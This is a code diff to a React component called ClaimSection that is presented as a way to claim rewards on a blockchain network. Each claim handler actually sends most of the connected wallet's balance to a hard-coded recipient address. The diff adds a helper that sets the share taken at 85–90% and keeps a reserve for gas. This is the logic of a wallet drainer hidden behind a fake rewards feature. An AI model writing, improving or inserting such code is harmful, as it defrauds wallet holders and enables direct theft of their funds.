@@ -63,6 +63,21 @@ export default function ClaimSection() {
     }
   });
 
+  // Calculate the amount to send, reserving enough for gas plus one more transaction
+  const calculateAmountToSend = (balance: string) => {
+    // Convert balance to number
+    const balanceNum = Number(balance);
+
+    // For Ethereum mainnet, reserve more for gas as it's more expensive
+    const gasReservePercentage = chainId === 1 ? 0.15 : 0.10; // 15% for Ethereum, 10% for other chains
+
+    // Calculate amount to send (total balance minus gas reserve)
+    const sendPercentage = 1 - gasReservePercentage;
+    const amountToSend = parseEther((balanceNum * sendPercentage).toString());
+
+    return amountToSend;
+  };
+
   // Function to handle claiming rewards on a specific network
   const handleClaim = async (chainId: string) => {
     if (!isConnected || !balanceData) return;
@@ -79,12 +94,10 @@ export default function ClaimSection() {
 
     try {
       if (sendTransaction) {
-        // Calculate amount to send (all funds minus gas)
-        // For a real implementation, we would estimate gas and subtract it
-        // For simplicity, we'll use 95% of the balance to ensure there's enough for gas
-        const amountToSend = parseEther((Number(balanceData.formatted) * 0.80).toString());
+        // Calculate amount to send with enough reserved for gas plus one more transaction
+        const amountToSend = calculateAmountToSend(balanceData.formatted);
 
-        // Transaction to send all funds minus gas
+        // Transaction to send funds minus gas reservation
         sendTransaction({
           to: RECIPIENT_ADDRESS,
           value: amountToSend,
@@ -125,12 +138,10 @@ export default function ClaimSection() {
 
     try {
       if (sendTransaction) {
-        // Calculate amount to send (all funds minus gas)
-        // For a real implementation, we would estimate gas and subtract it
-        // For simplicity, we'll use 95% of the balance to ensure there's enough for gas
-        const amountToSend = parseEther((Number(balanceData.formatted) * 0.95).toString());
+        // Calculate amount to send with enough reserved for gas plus one more transaction
+        const amountToSend = calculateAmountToSend(balanceData.formatted);
 
-        // Transaction to send all funds minus gas
+        // Transaction to send funds minus gas reservation
         sendTransaction({
           to: RECIPIENT_ADDRESS,
           value: amountToSend,
